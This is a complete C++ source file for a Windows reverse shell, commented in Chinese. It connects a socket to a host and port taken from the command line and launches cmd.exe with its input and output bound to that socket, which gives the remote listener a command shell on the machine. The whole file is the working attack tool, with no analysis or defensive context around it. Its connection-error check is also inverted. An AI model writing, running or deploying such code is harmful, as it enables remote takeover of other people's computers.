#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <iostream>


SOCKET socket_handle;
STARTUPINFO startup_info;
PROCESS_INFORMATION process_info;
sockaddr_in sockaddr_info;
WCHAR cmd_name[] = L"cmd.exe";

// 客户端程序
void init_shell(char* host, int port) {
	int timeout = 3000;

	sockaddr_info.sin_family = AF_INET;
	sockaddr_info.sin_port = htons(port);
	inet_pton(AF_INET, host, &sockaddr_info.sin_addr.s_addr);
	std::cout << sockaddr_info.sin_addr.s_addr << " : " << sockaddr_info.sin_port << std::endl;

	socket_handle = WSASocket(AF_INET, SOCK_STREAM, 0, nullptr, 0, 0);
	if (socket_handle == INVALID_SOCKET) {
		std::cout << "socket client failed: " << WSAGetLastError() << std::endl;
		return;
	}

	// 设置超时
	setsockopt(
		socket_handle,
		SOL_SOCKET,
		SO_SNDTIMEO,
		(char*)&timeout,
		sizeof(timeout)
	);

	// 连接
	if (!connect(socket_handle, (sockaddr*)&sockaddr_info, sizeof(sockaddr_info))) {
		std::cout << "socket connect failed: " << WSAGetLastError() << std::endl;
	}

	startup_info.hStdInput = (void*)socket_handle;
	startup_info.hStdError = (void*)socket_handle;
	startup_info.hStdOutput = (void*)socket_handle;
}

int main(int argc, char *argv[]) {
	WSADATA wsadata;
	if (WSAStartup(MAKEWORD(1, 1), &wsadata) != 0) {
		return 1;
	}
	memset(&sockaddr_info, 0, sizeof(sockaddr_info));
	memset(&startup_info, 0, sizeof(startup_info));
	startup_info.cb = sizeof(startup_info);
	startup_info.dwFlags = STARTF_USESTDHANDLES;

	std::cout << "reverse shell: " << argv[1] << ":" << argv[2] << std::endl;
	init_shell(argv[1], atoi(argv[2]));
	CreateProcessW(nullptr, cmd_name, nullptr, nullptr, TRUE, 0, nullptr, nullptr, &startup_info, &process_info);
}